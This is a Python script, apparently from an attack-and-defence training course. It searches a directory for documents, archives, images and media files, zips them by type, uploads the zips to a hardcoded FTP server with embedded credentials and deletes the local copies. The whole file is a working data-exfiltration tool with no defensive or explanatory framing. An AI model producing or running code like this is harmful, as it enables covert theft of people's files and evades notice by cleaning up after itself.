
# -*- coding:utf-8 -*-
import os
import zipfile
from ftplib import FTP
#搜索结果
keylist = ['txt','doc','docx','pdf','pptx','xlsx','zip','rar','jpg','gif','png','bmp','mp4','mp3']
result=[]
result_txt = []
result_doc = []
result_docx = []
result_pdf = []
result_pptx = []
result_xlsx = []

result_zip = []
result_rar = []

result_jpg = []
result_gif = []
result_png = []
result_bmp = []

result_mp4 = []
result_mp3 = []
#-----------------------------------------------------函数定义部分
#连接并登录
def ftpconnect(host,port,username, password):
    ftp = FTP()
    #ftp.set_debuglevel(2)         #打开调试级别2，显示详细信息
    ftp.connect(host, port)          #连接
    ftp.login(username, password)  #登录，如果匿名登录则用空串代替即可
    return ftp
#下载文件    
def downloadfile(ftp, remotepath, localpath):  #remotepath：上传服务器路径；localpath：本地路径；
    bufsize = 1024                #设置缓冲块大小
    fp = open(localpath,'wb')     #以写模式在本地打开文件
    ftp.retrbinary('RETR ' + remotepath, fp.write, bufsize) #接收服务器上文件并写入本地文件
    ftp.set_debuglevel(0)         #关闭调试
    fp.close()                    #关闭文件
#上传文件
def uploadfile(ftp, remotepath, localpath):
    bufsize = 1024
    fp = open(localpath, 'rb')
    ftp.storbinary('STOR '+ remotepath , fp, bufsize)    #上传文件
    ftp.set_debuglevel(0)
    fp.close() 

#目录遍历函数
def SearchPath(path):
    for folder,subFolders,files in os.walk(path):
        for file in files:#文件分析
            AnalyzeFile(folder,file)
        for subFolder in subFolders:#递归遍历
            SearchPath(subFolder)     
#文件分析，是否包含指定字符串，是否压缩文件中包含keyword
def AnalyzeFile(folder,filename):
    # if file.endswith(keyword): #文件名中包含关键字
    #     result.append(folder+"\\"+file)

    if filename.endswith('.txt') :
        result_txt.append(folder+"\\"+filename)
    if filename.endswith('.doc') :
        result_doc.append(folder+"\\"+filename)
    if filename.endswith('.docx') :
        result_docx.append(folder+"\\"+filename)
    if filename.endswith('.pdf') :
        result_pdf.append(folder+"\\"+filename)
    if filename.endswith('.pptx') :
        result_pptx.append(folder+"\\"+filename)
    if filename.endswith('.xlsx') :
        result_xlsx.append(folder+"\\"+filename)

    if filename.endswith('.zip') :
        result_zip.append(folder+"\\"+filename)
    if filename.endswith('.rar') :
        result_rar.append(folder+"\\"+filename)

    if filename.endswith('.jpg') :
        result_jpg.append(folder+"\\"+filename)
    if filename.endswith('.gif') :
        result_gif.append(folder+"\\"+filename)
    if filename.endswith('.png') :
        result_png.append(folder+"\\"+filename)
    if filename.endswith('.bmp') :
        result_bmp.append(folder+"\\"+filename)

    if filename.endswith('.mp4') :
        result_mp4.append(folder+"\\"+filename)
    if filename.endswith('.mp3') :
        result_mp3.append(folder+"\\"+filename)
       
        

#-----------------------------------------------------程序流程部分
if __name__ == "__main__":
    ftp = ftpconnect("192.168.0.106",21, "tk", "123456")

    dir = "e:/学习。/攻防/teachergive2/第一天"

    #开始检索
    print("开始检索["+dir+"]目录下的文件")
    #遍历
    SearchPath(dir)
    #输出
    print('result_txt: ',result_txt)
    print('result_doc: ',result_doc)
    print('result_docx: ',result_docx)
    print('result_pdf: ',result_pdf)
    print('result_pptx: ',result_pptx)
    print('result_xlsx: ',result_xlsx)

    print('result_zip: ',result_zip)
    print('result_rar: ',result_rar)

    print('result_jpg: ',result_jpg)
    print('result_gif: ',result_gif)
    print('result_png: ',result_png)
    print('result_bmp: ',result_bmp)

    print('result_mp4: ',result_mp4)
    print('result_mp3: ',result_mp3)

    if result_txt:
        resultzip = zipfile.ZipFile(dir+'/_txt.zip','w')
        for i in result_txt:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_txt.zip", dir+'/_txt.zip') #上传文件
        os.remove(dir+'/_txt.zip') #删除本地文件
    if result_doc:
        resultzip = zipfile.ZipFile(dir+'/_doc.zip','w')
        for i in result_doc:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_doc.zip", dir+'/_doc.zip') #上传文件
        os.remove(dir+'/_doc.zip') #删除本地文件
    if result_docx:
        resultzip = zipfile.ZipFile(dir+'/_docx.zip','w')
        for i in result_docx:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_docx.zip", dir+'/_docx.zip') #上传文件
        os.remove(dir+'/_docx.zip') #删除本地文件
    if result_pdf:
        resultzip = zipfile.ZipFile(dir+'/_pdf.zip','w')
        for i in result_pdf:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_pdf.zip", dir+'/_pdf.zip') #上传文件
        os.remove(dir+'/_pdf.zip') #删除本地文件
    if result_pptx:
        resultzip = zipfile.ZipFile(dir+'/_pptx.zip','w')
        for i in result_pptx:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_pptx.zip", dir+'/_pptx.zip') #上传文件
        os.remove(dir+'/_pptx.zip') #删除本地文件
    if result_xlsx:
        resultzip = zipfile.ZipFile(dir+'/_xlsx.zip','w')
        for i in result_xlsx:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_xlsx.zip", dir+'/_xlsx.zip') #上传文件
        os.remove(dir+'/_xlsx.zip') #删除本地文件

    if result_zip:
        resultzip = zipfile.ZipFile(dir+'/_zip.zip','w')
        for i in result_zip:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_zip.zip", dir+'/_zip.zip') #上传文件
        os.remove(dir+'/_zip.zip') #删除本地文件
    if result_rar:
        resultzip = zipfile.ZipFile(dir+'/_rar.zip','w')
        for i in result_rar:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_rar.zip", dir+'/_rar.zip') #上传文件
        os.remove(dir+'/_rar.zip') #删除本地文件

    if result_jpg:
        resultzip = zipfile.ZipFile(dir+'/_jpg.zip','w')
        for i in result_jpg:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_jpg.zip", dir+'/_jpg.zip') #上传文件
        os.remove(dir+'/_jpg.zip') #删除本地文件
    if result_gif:
        resultzip = zipfile.ZipFile(dir+'/_gif.zip','w')
        for i in result_gif:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_gif.zip", dir+'/_gif.zip') #上传文件
        os.remove(dir+'/_gif.zip') #删除本地文件
    if result_png:
        resultzip = zipfile.ZipFile(dir+'/_png.zip','w')
        for i in result_png:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_png.zip", dir+'/_png.zip') #上传文件
        os.remove(dir+'/_png.zip') #删除本地文件
    if result_bmp:
        resultzip = zipfile.ZipFile(dir+'/_bmp.zip','w')
        for i in result_bmp:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_bmp.zip", dir+'/_bmp.zip') #上传文件
        os.remove(dir+'/_bmp.zip') #删除本地文件

    if result_mp4:
        resultzip = zipfile.ZipFile(dir+'/_mp4.zip','w')
        for i in result_mp4:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_mp4.zip", dir+'/_mp4.zip') #上传文件
        os.remove(dir+'/_mp4.zip') #删除本地文件
    if result_mp3:
        resultzip = zipfile.ZipFile(dir+'/_mp3.zip','w')
        for i in result_mp3:
            resultzip.write(i)
        resultzip.close()
        uploadfile(ftp, "/text/_mp3.zip", dir+'/_mp3.zip') #上传文件
        os.remove(dir+'/_mp3.zip') #删除本地文件



    ftp.quit()